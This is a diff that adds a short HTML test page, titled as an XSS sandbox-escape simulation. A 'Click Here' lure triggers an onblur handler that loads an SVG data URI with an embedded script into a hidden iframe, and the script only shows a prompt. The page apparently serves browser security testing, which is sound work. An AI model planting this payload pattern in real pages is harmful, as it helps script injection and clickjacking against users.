@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, user-scalable=no">
+  <title>XSS Sandbox Escape Simulation</title>
+  <style>
+    iframe {
+      visibility: hidden;
+    }
+  </style>
+  <script>
+    window.onblur = function () {
+      document.getElementById("iframe").src = "data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><script>prompt('SVG XSS')</script></svg>";
+    };
+  </script>
+</head>
+<body>
+  <center>
+    <br>
+    <h1>Click Here</h1>
+  </center>
+  <iframe id="iframe"></iframe>
+</body>
+</html>
